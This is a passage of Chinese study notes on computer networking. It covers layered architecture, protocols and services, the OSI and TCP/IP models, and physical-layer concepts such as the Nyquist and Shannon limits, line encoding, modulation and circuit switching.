<li>第 n 层的实体不仅要使用第 n - 1 层的服务来实现自身定义的功能，还要向第 n + 1 层提供本层的服务，该服务是第 n 层及其下面各层提供的服务总和</li>
<li>最低层只提供服务，是整个层次结构的基础；中间各层既是下一层的服务使用者，又是上一层的服务提供者；最高层面向用户提供服务</li>
<li>上一层只能通过相邻层间的接口使用下一层的服务，而不能调用其他层的服务；下一层所提供服务的实现细节对上一层透明</li>
<li>两台主机通信时，对等层在逻辑上有一条直接信道，表现为不经过下层就把信息传送到对方</li>
</ul>
<h4> 计算机网络协议、接口、服务的概念</h4>
<ul>
<li>
<p><strong>协议</strong></p>
<p>协议，就是规则的集合。在网络中要做到有条不紊地交换数据，就必须遵循一些事先约定好的规则。这些规则明确规定了所交换的数据的格式及有关的同步问题。这些 <strong>为进行网络中的数据交换而建立的规则、标准或约定称为网络协议（Network Protocol）</strong>，它是控制两个（或多个）对等实体进行通信的规则的集合，是水平的。不对等实体之间是没有协议的，比如用 TCP/IP 协议栈通信的两个结点，结点 A 的传输层和结点 B 的传输层之间存在协议，但结点 A 的传输层和结点 B 的网络层之间不存在协议。网络协议也简称为协议。</p>
<p><strong>协议由语法、语义和同步三部分组成</strong>。语法规定了传输数据的格式；语义规定了所要完成的功能，即需要发出何种控制信息、完成何种动作及做出何种应答；同步规定了执行各种操作的条件、时序关系等，即事件实现顺序的详细说明。一个完整的协议通常应具有线路管理（建立、释放连接）、差错控制、数据转换等功能。</p>
</li>
<li>
<p><strong>接口</strong></p>
<p><strong>接口是同一结点内相邻两层间交换信息的连接点，是一个系统内部的规定</strong>。每层只能为紧邻的层次之间定义接口，不能跨层定义接口。在典型的接口上，同一结点相邻两层的实体通过 <strong>服务访问点（Service Access Point，SAP）进行交互</strong>。服务是通过 SAP 提供给上层使用的，第 <code>n</code> 层的 SAP 就是第 <code>n + 1</code> 层可以访问第 <code>n</code> 层服务的地方。每个 SAP 都有一个能够标识它的地址。SAP 是一个抽象的概念，它实际上是一个逻辑接口（类似于邮政信箱），但和通常所说的两个设备之间的硬件接口是很不一样的。</p>
</li>
<li>
<p><strong>服务</strong></p>
<p><strong>服务是指下层为紧邻的上层提供的功能调用，它是垂直的</strong>。对等实体在协议的控制下，使得本层能为上一层提供服务，但要实现本层协议还需要使用下一层所提供的服务。</p>
<p>上层使用下层所提供的服务时必须与下层交换一些命令，这些命令在 OSI 参考模型中称为服务原语。<strong>OSI 参考模型将原语划分为四类：</strong></p>
<ul>
<li><strong>请求（Request）</strong>：由服务用户发往服务提供者，请求完成某项工作</li>
<li><strong>指示（Indication）</strong>：由服务提供者发往服务用户，指示用户做某件事情</li>
<li><strong>响应（Response）</strong>：由服务用户发往服务提供者，作为对指示的响应</li>
<li><strong>证实（Confirmation）</strong>：由服务提供者发往服务用户，作为对请求的证实</li>
</ul>
<p>这四类原语用于不同的功能，如：建立连接、传输数据和断开连接等。有应答服务包括全部四类原语，而无应答服务则只有请求和指示两类原语。</p>
<p>协议和服务在概念上是不一样的。首先，只有本层协议的实现才能保证向上一层提供服务。本层的服务用户只能看见服务而无法看见下面的协议，即 <strong>下面的协议对上层的服务用户是透明的</strong>。其次，协议是 “水平的”，即协议是控制对等实体之间通信的规则。但服务是 “垂直的”，即 <strong>服务是由下层通过层间接口向上层提供的</strong>。另外，并非在一层内完成的全部功能都称为服务，只有那些能够被高一层实体 “看得见” 的功能才称为服务。</p>
<p><strong>计算机网络提供的服务可按以下三种方式分类：</strong></p>
<ul>
<li>
<p><strong>面向连接服务与无连接服务</strong></p>
<p>在面向连接服务中，通信前双方必须先建立连接，分配相应的资源（如：缓冲区），以保证通信能正常进行，传输结束后释放连接和所占用的资源。因此这种服务可以分为连接建立、数据传输和连接释放三个阶段。例如：TCP 就是一种面向连接服务的协议。</p>
<p>在无连接服务中，通信前双方不需要先建立连接，需要发送数据时可直接发送，把每个带有目的地址的包（报文分组）传送到线路上，由系统选定路线进行传输。这是一种不可靠的服务。这种服务常被描述为 “尽最大努力交付”（Best-Effort-Delivery），它并不保证通信的可靠性。例如：IP、UDP 就是一种无连接服务的协议。</p>
</li>
<li>
<p><strong>可靠服务和不可靠服务</strong></p>
<p>可靠服务是指网络具有纠错、检错、应答机制，能保证数据正确、可靠地传送到目的地。</p>
<p>不可靠服务是指网络只是尽量正确、可靠地传送，而不能保证数据正确、可靠地传送到目的地，是一种尽力而为的服务。</p>
<p>对于提供不可靠服务的网络，其网络的正确性、可靠性要由应用或用户来保障。例如：用户收到信息后要判断信息的正确性，如果不正确，那么用户要把出错信息报告给信息的发送者，以便发送者采取纠正措施。通过用户的这些措施，可以把不可靠的服务变成可靠的服务。</p>
</li>
<li>
<p><strong>有应答服务和无应答服务</strong></p>
<p>有应答服务是指接收方在收到数据后向发送方给出相应的应答，该应答由传输系统内部自动实现，而不由用户实现。所发送的应答既可以是肯定应答，也可以是否定应答，通常在接收到的数据有错误时发送否定应答。例如：文件传输服务就是一种有应答服务。</p>
<p>无应答服务是指接收方收到数据后不自动给出应答。若需要应答，则由高层实现。例如：对于 WWW 服务，客户端收到服务器发送的页面文件后不给出应答。</p>
</li>
</ul>
</li>
</ul>
<h4> ISO/OSI 参考模型和 TCP/IP 模型</h4>
<ol>
<li>
<p><strong>OSI 参考模型</strong></p>
<p>国际标准化组织（ISO）提出的网络体系结构模型，称为 <strong>开放系统互连参考模型（OSI/RM）</strong>，通常简称为 OSI 参考模型。OSI 参考模型有七层，自下而上依次为：<strong>物理层、数据链路层、网络层、传输层、会话层、表示层、应用层</strong>。低三层统称为通信子网，它是为了联网而附加的通信设备，完成数据的传输功能；高三层统称为资源子网，它相当于计算机系统，完成数据的处理等功能。传输层承上启下。</p>
<p><strong>OSI 参考模型各层的功能：</strong></p>
<ul>
<li>
<p><strong>物理层（Physical Layer）</strong></p>
<p>物理层的传输单位是比特，功能是 <strong>在物理媒体上为数据端设备透明地传输原始比特流。</strong></p>
<p>物理层主要定义数据终端设备（DTE）和数据通信设备（DCE）的物理与逻辑连接方法，所以物理层协议也称物理层接口标准。由于在通信技术的早期阶段，通信规则称为规程（Procedure），因此物理层协议也称物理层规程。</p>
<p>物理层接口标准很多，如：EIA-232C、EIA/TI ARS-449、CCITT 的 X.21 等。</p>
<p><strong>物理层主要研究以下内容：</strong></p>
<ul>
<li>通信链路与通信结点的连接需要一些电路接口，物理层规定了这些接口的一些参数，如：机械形状和尺寸、交换电路的数量和排列等，例如：笔记本电脑上的网线接口，就是物理层规定的内容之一</li>
<li>物理层也规定了通信链路上传输的信号的意义和电气特征。例如：物理层规定信号 A 代表数字 0，那么当结点要传输数字 0 时，就会发出信号 A，当结点接收到信号 A 时，就知道自己接收到的实际上是数字 0</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>传输信息所利用的一些 <strong>物理媒体</strong>，如：双绞线、光缆、无线信道等，并不在物理层协议之内而在物理层协议下面。因此，有人把物理媒体当作第 0 层</p>
</div>
</li>
<li>
<p><strong>数据链路层（Data Link Layer）</strong></p>
<p>数据链路层的传输单位是帧，任务是 <strong>将网络层传来的 IP 数据报组装成帧</strong>。数据链路层的功能可以概括为成帧、差错控制、流量控制和传输管理等。</p>
<p>由于外界噪声的干扰，原始的物理连接在传输比特流时可能发生错误。A（左边结点）和 B（右边结点）两个结点，左边结点想向右边结点传输数字 0，于是发出了信号 A；但传输过程中受到干扰，信号 A 变成了信号 B，而信号 B 又刚好代表 1，右边结点接收到信号 B 时，就会误以为左边结点传送了数字 1，从而发生差错。两个结点之间如果规定了数据链路层协议，那么可以检测出这些差错；然后把收到的错误信息丢弃，这就是差错控制功能。</p>
<p>在两个相邻结点 A 和 B 之间传送数据时，由于两个结点性能的不同，可能结点 A 发送数据的速率会比结点 B 接收数据的速率快，如果不加控制，那么结点 B 就会丢弃很多来不及接收的正确数据，造成传输线路效率的下降。流量控制可以协调两个结点的速率，使结点 A 发送数据的速率刚好是结点 B 可以接收的速率。</p>
<p>广播式网络在数据链路层还要处理新的问题，即如何控制对共享信道的访问。数据链路层的一个特殊的子层——介质访问子层，就是专门处理这个问题的。</p>
<p>典型的数据链路层协议有 SDLC、HDLC、PPP、STP 和帧中继等。</p>
</li>
<li>
<p><strong>网络层（Network Layer）</strong></p>
<p>网络层的传输单位是数据报，它关心的是通信子网的运行控制，主要任务是把网络层的协议数据单元（分组）从源端传到目的端，为分组交换网上的不同主机提供通信服务。关键问题是对分组进行路由选择，并实现流量控制、拥塞控制、差错控制和网际互连等功能。</p>
<p>结点 A 向结点 B 传输一个分组时，既可经过边 a、c、g，也可经过边 b、h，有很多条可以选择的路由，而网络层的作用就是根据网络的情况，利用相应的路由算法计算出一条合适的路径，使这个分组可以顺利到达结点 B。</p>
<p>流量控制与数据链路层的流量控制含义一样，都是协调 A 的发送速率和 B 的接收速率。</p>
<p>差错控制是通信两结点之间约定的特定检错规则，如：奇偶校验码，接收方根据这个规则检查接收到的分组是否出现差错，如果出现了差错，那么能纠错就纠错，不能纠错就丢弃，确保向上层提交的数据都是无误的。</p>
<p>如果结点都处于来不及接收分组而要丢弃大量分组的情况，那么网络就处于拥塞状态，拥塞状态使得网络中的两个结点无法正常通信。网络层要采取一定的措施来缓解这种拥塞，这就是 <strong>拥塞控制。</strong></p>
<p>因特网是一个很大的互联网，它由大量异构网络通过路由器（Router）相互连接起来。因特网的主要网络层协议是无连接的网际协议（Internet Protocol，IP）和许多路由选择协议，因此因特网的网络层也称网际层或 IP 层。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>网络层中的 “网络” 一词并不是通常谈及的具体网络，而是在计算机网络体系结构中使用的专有名词</p>
</div>
<p>网络层的协议有 IP、IPX、ICMP、IGMP、ARP、RARP 和 OSPF 等。</p>
</li>
<li>
<p><strong>传输层（Transport Layer）</strong></p>
<p>传输层也称运输层，传输单位是报文段（TCP）或用户数据报（UDP），传输层 <strong>负责主机中两个进程之间的通信，功能是为端到端连接提供可靠的传输服务</strong>，为端到端连接提供流量控制、差错控制、服务质量、数据传输管理等服务。</p>
<p><strong>数据链路层提供的是点到点的通信，传输层提供的是端到端的通信，两者不同</strong>。通俗地说，点到点可以理解为主机到主机之间的通信，一个点是指一个硬件地址或 IP 地址，网络中参与通信的主机是通过硬件地址或 IP 地址标识的；端到端的通信是指运行在不同主机内的两个进程之间的通信；一个进程由一个端口来标识，所以称为端到端通信。</p>
<p>使用传输层的服务，高层用户可以直接进行端到端的数据传输，从而忽略通信子网的存在。通过传输层的屏蔽，高层用户看不到子网的交替和变化。由于一台主机可同时运行多个进程，因此 <strong>传输层具有复用和分用的功能</strong>。复用是指多个应用层进程可同时使用下面传输层的服务，分用是指传输层把收到的信息分别交付给上面应用层中相应的进程。</p>
<p>传输层的协议有 TCP、UDP。</p>
</li>
<li>
<p><strong>会话层（Session Layer）</strong></p>
<p><strong>会话层允许不同主机上的各个进程之间进行会话</strong>。会话层利用传输层提供的端到端的服务，向表示层提供它的增值服务。这种服务主要为表示层实体或用户进程建立连接并在连接上有序地传输数据，这就是会话，也称建立同步（SYN）。</p>
<p>会话层负责管理主机间的会话进程，包括建立、管理及终止进程间的会话。会话层可以使用校验点使通信会话在通信失效时从校验点继续恢复通信，实现数据同步。</p>
</li>
<li>
<p><strong>表示层（Presentation Layer）</strong></p>
<p><strong>表示层主要处理在两个通信系统中交换信息的表示方式</strong>。不同机器采用的编码和表示方法不同，使用的数据结构也不同。为了使不同表示方法的数据和信息之间能互相交换，表示层采用抽象的标准方法定义数据结构，并采用标准的编码形式。数据压缩、加密和解密也是表示层可提供的数据表示变换功能。</p>
</li>
<li>
<p><strong>应用层（Application Layer）</strong></p>
<p>应用层是 OSI 参考模型的最高层，<strong>是用户与网络的界面</strong>。应用层为特定类型的网络应用提供访问 OSI 参考模型环境的手段。因为用户的实际应用多种多样，这就要求应用层采用不同的应用协议来解决不同类型的应用要求，因此应用层是最复杂的一层，使用的协议也最多。典型的协议有用于文件传送的 FTP、用于电子邮件的 SMTP、用于万维网的 HTTP 等。</p>
</li>
</ul>
</li>
<li>
<p><strong>TCP/IP 模型</strong></p>
<p>ARPA 在研究 ARPAnet 时提出了 TCP/IP 模型，模型从低到高依次为：<strong>网络接口层（对应 OSI 参考模型中的物理层和数据链路层）、网际层、传输层和应用层（对应 OSI 参考模型中的会话层、表示层和应用层）</strong>。TCP/IP 由于得到广泛应用而成为事实上的国际标准。</p>
<p><strong>网络接口层</strong> 的功能类似于 OSI 参考模型的物理层和数据链路层。它表示与物理网络的接口，但实际上 TCP/IP 本身并未真正描述这一部分，只是指出主机必须使用某种协议与网络连接，以便在其上传递 IP 分组。具体的物理网络既可以是各种类型的局域网，如：以太网、令牌环网、令牌总线网等，也可以是诸如：电话网、SDH、X.25、帧中继和 ATM 等公共数据网络。<strong>网络接口层的作用是从主机或结点接收 IP 分组，并把它们发送到指定的物理网络上。</strong></p>
<p><strong>网际层</strong>（主机-主机）是 TCP/IP 体系结构的关键部分。它和 OSI 参考模型的网络层在功能上非常相似。网际层将分组发往任何网络，并为之独立地选择合适的路由，但它不保证各个分组有序地到达，各个分组的有序交付由高层负责。<strong>网际层定义了标准的分组格式和协议，即 IP</strong>。当前采用的 IP 协议是第 4 版，即 IPv4，它的下一版本是 IPv6。</p>
<p><strong>传输层</strong>（应用-应用或进程-进程）的功能同样和 OSI 参考模型中的传输层类似，即使得 <strong>发送端和目的端主机上的对等实体进行会话</strong>。传输层主要使用以下两种协议：</p>
<ul>
<li><strong>传输控制协议（Transmission Control Protocol，TCP）</strong>：它是面向连接的，数据传输的单位是报文段，能够提供可靠的交付</li>
<li><strong>用户数据报协议（User Datagram Protocol，UDP）</strong>：它是无连接的，数据传输的单位是用户数据报，不保证提供可靠的交付，只能提供 “尽最大努力交付”</li>
</ul>
<p><strong>应用层</strong>（用户-用户）包含所有的高层协议，如：虚拟终端协议（Telnet）、文件传输协议（FTP）、域名解析服务（DNS）、电子邮件协议（SMTP）和超文本传输协议（HTTP）。</p>
<p>网际层 IP 协议是因特网中的核心协议；TCP/IP 可以为各式各样的应用提供服务（所谓的 everything over IP），同时 TCP/IP 也允许 IP 协议在由各种网络构成的互联网上运行（所谓的 IP over everything）。正因为如此，因特网才会发展到今天的规模。</p>
</li>
<li>
<p><strong>TCP/IP 模型与 OSI 参考模型的比较</strong></p>
<p><strong>相似之处：</strong></p>
<ul>
<li>都采取分层的体系结构，将庞大且复杂的问题划分为若干较容易处理的、范围较小的问题，而且分层的功能也大体相似</li>
<li>都是基于独立的协议栈的概念</li>
<li>都可以解决异构网络的互连，实现世界上不同厂家生产的计算机之间的通信</li>
</ul>
<p><strong>不同之处：</strong></p>
<ul>
<li>OSI 参考模型的最大贡献就是精确地定义了三个主要概念：服务、协议和接口，这与现代的面向对象程序设计思想非常吻合。而 TCP/IP 模型在这三个概念上却没有明确区分，不符合软件工程的思想</li>
<li>OSI 参考模型产生在协议发明之前，没有偏向于任何特定的协议，通用性良好。但设计者在协议方面没有太多经验，不知道把哪些功能放到哪一层更好。TCP/IP 模型正好相反，首先出现的是协议，模型实际上是对已有协议的描述，因此不会出现协议不能匹配模型的情况，但该模型不适合于任何其他非 TCP/IP 的协议栈</li>
<li>TCP/IP 模型在设计之初就考虑到了多种异构网的互连问题，并将网际协议（IP）作为一个单独的重要层次。OSI 参考模型最初只考虑到用一种标准的公用数据网将各种不同的系统互连。OSI 参考模型认识到 IP 的重要性后，只好在网络层中划分出一个子层来完成类似于 TCP/IP 模型中的 IP 的功能</li>
<li>OSI 参考模型在网络层支持无连接和面向连接的通信，但在传输层仅有面向连接的通信。而 TCP/IP 模型认为可靠性是端到端的问题，因此它在网际层仅有一种无连接的通信模式，但传输层支持无连接和面向连接两种模式</li>
</ul>
</li>
</ol>
<p>无论是 OSI 参考模型还是 TCP/IP 模型，都不是完美的，对二者的讨论和批评都很多。OSI 参考模型的设计者从工作的开始，就试图建立一个全世界的计算机网络都要遵循的统一标准。从技术角度来看，他们希望追求一种完美的理想状态，这也导致基于 OSI 参考模型的软件效率极低。</p>
<p>OSI 参考模型缺乏市场与商业动力，结构复杂，实现周期长，运行效率低，这是它未能达到预期目标的重要原因。</p>
<p>简单介绍使用 <strong>通信协议栈进行通信的结点的数据传输过程</strong>：每个协议栈的最顶端都是一个面向用户的接口，下面各层是为通信服务的协议。用户传输一个数据报时，通常给出用户能够理解的自然语言，然后通过应用层，将自然语言会转化为用于通信的通信数据。通信数据到达传输层，作为传输层的数据部分（传输层 SDU），加上传输层的控制信息（传输层 PCI），组成传输层的 PDU，然后交到网络层，传输层的 PDU 下放到网络层后，就成为网络层的 SDU，然后加上网络层的 PCI，又组成了网络层的 PDU，下放到数据链路层，就这样层层下放，层层包裹，最后形成的数据报通过通信线路传输，到达接收方结点协议栈，接收方再逆向地逐层把 “包裹” 拆开，然后把收到的数据提交给用户。</p>
<h2> 物理层</h2>
<h3> 通信基础</h3>
<h4> 基本概念</h4>
<ol>
<li>
<p><strong>数据、信号与码元</strong></p>
<p><strong>通信的目的是传送信息</strong>，如：文字、图像和视频等。<strong>数据是指传送信息的实体</strong>。<strong>信号则是数据的电气或电磁表现</strong>，是数据在传输过程中的存在形式。数据和信号都可用 “模拟的” 或 “数字的” 来修饰：连续变化的数据（或信号）称为模拟数据（或模拟信号）；取值仅允许为有限的几个离散数值的数据（或信号）称为数字数据（或数字信号）。</p>
<p><strong>数据传输方式可分为串行传输和并行传输</strong>。串行传输是指 1 比特 1 比特地按照时间顺序传输（远距离通信通常采用串行传输），并行传输是指若干比特通过多条通信信道同时传输。</p>
<p><strong>码元是指用一个固定时长的信号波形（数字脉冲）表示一位 k 进制数字，代表不同离散数值的基本波形</strong>，是数字通信中数字信号的计量单位，这个时长内的信号称为 <code>k</code> 进制码元，而该时长称为码元宽度。<code>1</code> 码元可以携带若干比特的信息量。例如：在使用二进制编码时，只有两种不同的码元：一种代表 <code>0</code> 状态，另一种代表 <code>1</code> 状态。</p>
</li>
<li>
<p><strong>信源、信道与信宿</strong></p>
<p><strong>数据通信是指数字计算机或其他数字终端之间的通信</strong>。一个数据通信系统 <strong>主要划分为信源、信道和信宿三部分</strong>。信源是产生和发送数据的源头。信宿是接收数据的终点，它们通常都是计算机或其他数字终端装置。发送端信源发出的信息需要通过变换器转换成适合于在信道上传输的信号，而通过信道传输到接收端的信号先由反变换器转换成原始信息，再发送给信宿。</p>
<p><strong>信道与电路并不等同，信道是信号的传输媒介</strong>。一个信道可视为一条线路的逻辑部件，一般用来表示向某个方向传送信息的介质，因此一条通信线路往往包含一条发送信道和一条接收信道。<strong>噪声源</strong> 是信道上的噪声（即对信号的干扰）及分散在通信系统其他各处的噪声的集中表示。</p>
<p>信道按传输信号形式的不同，可分为传送模拟信号的模拟信道和传送数字信号的数字信道两大类；信道按传输介质的不同可分为无线信道和有线信道。</p>
<p><strong>信道上传送的信号有基带信号和宽带信号之分</strong>。基带信号将数字信号 <code>1</code> 和 <code>0</code> 直接用两种不同的电压表示，然后送到数字信道上传输（称为基带传输）；宽带信号将基带信号进行调制后形成频分复用模拟信号，然后送到模拟信道上传输（称为宽带传输）。</p>
<p><strong>从通信双方信息的交互方式看，可分为三种基本方式：</strong></p>
<ul>
<li><strong>单向通信</strong>：只有一个方向的通信而没有反方向的交互，仅需要一条信道。例如：无线电广播、电视广播就属于这种类型</li>
<li><strong>半双工通信</strong>：通信的双方都可以发送或接收信息，但任何一方都不能同时发送和接收信息，此时需要两条信道</li>
<li><strong>全双工通信</strong>：通信双方可以同时发送和接收信息，也需要两条信道</li>
</ul>
<p><strong>信道的极限容量</strong> 是指信道的最高码元传输速率或信道的极限信息传输速率。</p>
</li>
<li>
<p><strong>速率、波特与带宽</strong></p>
<p><strong>速率</strong> 也称数据率，指的是数据传输速率，表示单位时间内传输的数据量。可以用码元传输速率和信息传输速率表示。</p>
<ul>
<li><strong>码元传输速率</strong>：又称波特率，它表示单位时间内数字通信系统所传输的码元个数（也可称为脉冲个数或信号变化的次数），<strong>单位是波特（Baud）</strong>。<code>1</code> 波特表示数字通信系统每秒传输一个码元。码元可以是多进制的，也可以是二进制的，码元速率与进制数无关</li>
<li><strong>信息传输速率</strong>：又称信息速率、比特率等，它表示单位时间内数字通信系统传输的二进制码元个数（即比特数），<strong>单位是比特/秒（b/s）。</strong></li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">波特和比特是两个不同的概念</p>
<p>码元传输速率也称调制速率、波形速率或符号速率。但码元传输速率与信息传输速率在数量上却又有一定的关系。若一个码元携带 <code>n</code> 比特的信息量，则 <code>M</code> 波特率的码元传输速率所对应的信息传输速率为 <code>Mn</code> 比特/秒</p>
</div>
<p><strong>带宽</strong> 原指信号具有的频带宽度，单位是赫兹（Hz）。在实际网络中，由于数据率是信道最重要的指标之一，而带宽与数据率存在数值上的互换关系，因此常用来表示网络的通信线路所能传输数据的能力。因此，<strong>带宽表示单位时间内从网络中的某一点到另一点所能通过的最高数据率</strong>。显然，此时带宽的单位不再是 <code>Hz</code>，而是 <code>b/s</code>。</p>
</li>
</ol>
<h4> 奈奎斯特定理与香农定理</h4>
<ol>
<li>
<p><strong>奈奎斯特定理</strong></p>
<p>具体的信道所能通过的频率范围总是有限的。信号中的许多高频分量往往不能通过信道，否则在传输中会衰减，导致接收端收到的信号波形失去码元之间的清晰界限，这种现象称为 <strong>码间串扰</strong>。奈奎斯特（Nyquist）定理又称奈氏准则，它规定：在理想低通（没有噪声、带宽有限）的信道中，为了避免码间串扰，极限码元传输速率为 2W 波特，其中 <code>W</code> 是理想低通信道的带宽。若用 <code>V</code> 表示每个码元离散电平的数目（码元的离散电平数目是指有多少种不同的码元，比如有 <code>16</code> 种不同的码元，则需要 <code>4</code> 个二进制位，因此数据传输速率是码元传输速率的 <code>4</code> 倍），则 <strong>极限数据率为：</strong></p>
<p><em>理想低通信道下的极限数据传输速率 = 2Wlog<sub>2</sub>V（单位为 b/s）</em></p>
<p>对于奈氏准则，可以得出以下结论：</p>
<ul>
<li>在任何信道中，码元传输速率是有上限的。若传输速率超过此上限，就会出现严重的码间串扰问题，使得接收端不可能完全正确识别码元</li>
<li>信道的频带越宽（即通过的信号高频分量越多），就可用更高的速率进行码元的有效传输</li>
<li>奈氏准则给出了码元传输速率的限制，但并未对信息传输速率给出限制，即未对一个码元可以对应多少个二进制位给出限制</li>
</ul>
<p>由于码元传输速率受奈氏准则的制约，所以要提高数据传输速率，就必须设法使每个码元携带更多比特的信息量，此时就需要采用多元制的调制方法。</p>
</li>
<li>
<p><strong>香农定理</strong></p>
<p>香农（Shannon）定理给出了带宽受限且有高斯白噪声干扰的信道的极限数据传输速率，当用此速率进行传输时，可以做到不产生误差。<strong>香农定理定义为：</strong></p>
<p><em>信道的极限数据传输速率 = Wlog<sub>2</sub>(1 + S/N)（单位为 b/s）</em></p>
<p>式中，<code>W</code> 为信道的带宽，<code>S</code> 为信道所传输信号的平均功率，<code>N</code> 为信道内部的高斯噪声功率。<code>S/N</code> 为信噪比，即信号的平均功率与噪声的平均功率之比，信噪比 = 10log<sub>10</sub>(S/N)（单位为 dB），例如：当 <code>S/N = 10</code> 时，信噪比为 <code>10dB</code>，而当 <code>S/N=1000</code> 时，信噪比为 <code>30dB</code>。</p>
<p>对于香农定理，可以得出以下结论：</p>
<ul>
<li>信道的带宽或信道中的信噪比越大，信息的极限传输速率越高</li>
<li>对一定的传输带宽和一定的信噪比，信息传输速率的上限是确定的</li>
<li>只要信息传输速率低于信道的极限传输速率，就能找到某种方法来实现无差错的传输</li>
<li>香农定理得出的是极限信息传输速率，实际信道能达到的传输速率要比它低不少</li>
</ul>
</li>
</ol>
<p>奈氏准则只考虑了带宽与极限码元传输速率的关系，而香农定理不仅考虑到了带宽，也考虑到了信噪比。这从另一个侧面表明，一个码元对应的二进制位数是有限的。</p>
<h4> 编码与调制</h4>
<p>数据无论是数字的还是模拟的，为了传输的目的都必须转变成信号。<strong>把数据变换为模拟信号的过程称为调制，把数据变换为数字信号的过程称为编码。</strong></p>
<p>信号是数据的具体表示形式，它和数据有一定的关系，但又和数据不同。数字数据可以通过数字发送器转换为数字信号传输，也可以通过调制器转换成模拟信号传输；同样，模拟数据可以通过 PCM 编码器转换成数字信号传输，也可以通过放大器调制器转换成模拟信号传输。这样，就形成了下列 <strong>四种编码方式。</strong></p>
<ol>
<li>
<p><strong>数字数据编码为数字信号</strong></p>
<p>数字数据编码用于基带传输中，即 <strong>在基本不改变数字数据信号频率的情况下，直接传输数字信号</strong>。具体用什么样的数字信号表示 <code>0</code> 及用什么样的数字信号表示 <code>1</code> 就是所谓的编码。编码的规则有多种，只要能有效地把 <code>1</code> 和 <code>0</code> 区分开即可，<strong>常用的数字数据编码有以下几种：</strong></p>
<ul>
<li><strong>归零编码</strong>：在归零编码（RZ）中用高电平代表 <code>1</code>、低电平代表 <code>0</code>（或者相反），每个时钟周期的中间均跳变到低电平（归零），接收方根据该跳变调整本方的时钟基准，这就为传输双方提供了自同步机制。由于归零需要占用一部分带宽，因此传输效率受到了一定的影响</li>
<li><strong>非归零编码</strong>：非归零编码（NRZ）与 RZ 编码的区别是不用归零，一个周期可以全部用来传输数据。但 NRZ 编码无法传递时钟信号，双方难以同步，因此若想传输高速同步数据，则需要都带有时钟线</li>
<li><strong>反向非归零编码</strong>：反向非归零编码（NRZI）与 NRZ 编码的区别是用信号的翻转代表 <code>0</code>、信号保持不变代表 <code>1</code>。翻转的信号本身可以作为一种通知机制。这种编码方式集成了前两种编码的优点，既能传输时钟信号，又能尽量不损失系统带宽。USB2.0 通信的编码方式就是 NRZI 编码</li>
<li><strong>曼彻斯特编码</strong>：曼彻斯特编码（Manchester Encoding）将一个码元分成两个相等的间隔，前一个间隔为高电平而后一个间隔为低电平表示码元 <code>1</code>；码元 <code>0</code> 的表示方法则正好相反。当然，也可采用相反的规定。该编码的特点是，在每个码元的中间出现电平跳变，位中间的跳变既作为时钟信号（可用于同步），又作为数据信号，但它所占的频带宽度是原始基带宽度的两倍。以太网使用的编码方式就是曼彻斯特编码</li>
<li><strong>差分曼彻斯特编码</strong>：差分曼彻斯特编码常用于局域网传输，其规则是：若码元为 <code>1</code>，则前半个码元的电平与上一码元的后半个码元的电平相同；若码元为 <code>0</code>，则情形相反。该编码的特点是，在每个码元的中间都有一次电平的跳转，可以实现自同步，且抗干扰性较好</li>
<li><strong>4B/5B 编码</strong>：将欲发送数据流的每 <code>4</code> 位作为一组，然后按照 4B/5B 编码规则将其转换成相应的 <code>5</code> 位码。<code>5</code> 位码共 <code>32</code> 种组合，但只采用其中的 <code>16</code> 种对应 <code>16</code> 种不同的 <code>4</code> 位码，其他 <code>16</code> 种作为控制码（帧的开始和结束、线路的状态信息等）或保留</li>
</ul>
</li>
<li>
<p><strong>数字数据调制为模拟信号</strong></p>
<p>数字数据调制技术在发送端将数字信号转换为模拟信号，而在接收端将模拟信号还原为数字信号，分别对应于调制解调器的调制和解调过程。<strong>基本的数字调制方法有如下几种：</strong></p>
<ul>
<li><strong>幅移键控（ASK）</strong>：通过改变载波信号的振幅来表示数字信号 <code>1</code> 和 <code>0</code>，而载波的频率和相位都不改变。比较容易实现，但抗干扰能力差</li>
<li><strong>频移键控（FSK）</strong>：通过改变载波信号的频率来表示数字信号 <code>1</code> 和 <code>0</code>，而载波的振幅和相位都不改变。容易实现，抗干扰能力强，目前应用较为广泛</li>
<li><strong>相移键控（PSK）</strong>：通过改变载波信号的相位来表示数字信号 <code>1</code> 和 <code>0</code>，而载波的振幅和频率都不改变。它又分为绝对调相和相对调相</li>
<li><strong>正交振幅调制（QAM）</strong>：在频率相同的前提下，将 ASK 与 PSK 结合起来，形成叠加信号。设波特率为 <code>B</code>，采用 <code>m</code> 个相位，每个相位有 <code>n</code> 种振幅，则该 QAM 技术的 <strong>数据传输速率 R 为</strong>：<em>R = Blog<sub>2</sub>(mn)（单位为 b/s）</em></li>
</ul>
</li>
<li>
<p><strong>模拟数据编码为数字信号</strong></p>
<p>这种编码方式最典型的例子是常用于对音频信号进行编码的脉码调制（PCM）。它主要包括三个步骤，即采样、量化和编码。</p>
<p><strong>采样定理</strong>：在通信领域，带宽是指信号最高频率与最低频率之差，单位为 Hz。因此，将模拟信号转换成数字信号时，假设原始信号中的最大频率为 <code>f</code>，那么采样频率 f<sub>采样</sub> 必须大于或等于最大频率 <code>f</code> 的两倍，才能保证采样后的数字信号完整保留原始模拟信号的信息（只需记住结论）。另外，采样定理又称奈奎斯特定理。</p>
<ul>
<li><strong>采样</strong>：是指对模拟信号进行周期性扫描，把时间上连续的信号变成时间上离散的信号。根据采样定理，当采样的频率大于或等于模拟数据的频带带宽（最高变化频率）的两倍时，所得的离散信号可以无失真地代表被采样的模拟数据</li>
<li><strong>量化</strong>：是把采样取得的电平幅值按照一定的分级标度转化为对应的数字值并取整数，这样就把连续的电平幅值转换为了离散的数字量。采样和量化的实质就是分割和转换</li>
<li><strong>编码</strong>：是把量化的结果转换为与之对应的二进制编码</li>
</ul>
</li>
<li>
<p><strong>模拟数据调制为模拟信号</strong></p>
<p>为了实现传输的有效性，可能需要较高的频率。这种调制方式还可以使用频分复用（FDM）技术，充分利用带宽资源。电话机和本地局交换机采用模拟信号传输模拟数据的编码方式，模拟的声音数据是加载到模拟的载波信号中传输的。</p>
</li>
</ol>
<h4> 电路交换、报文交换与分组交换</h4>
<ol>
<li>
<p><strong>电路交换</strong></p>
<p>在进行数据传输前，两个结点之间必须先建立一条专用（双方独占）的物理通信路径（由通信双方之间的交换设备和链路逐段连接而成），该路径可能经过许多中间结点。这一路径在整个数据传输期间一直被独占，直到通信结束后才被释放。因此，<strong>电路交换技术分为三个阶段：连接建立、数据传输和连接释放。</strong></p>
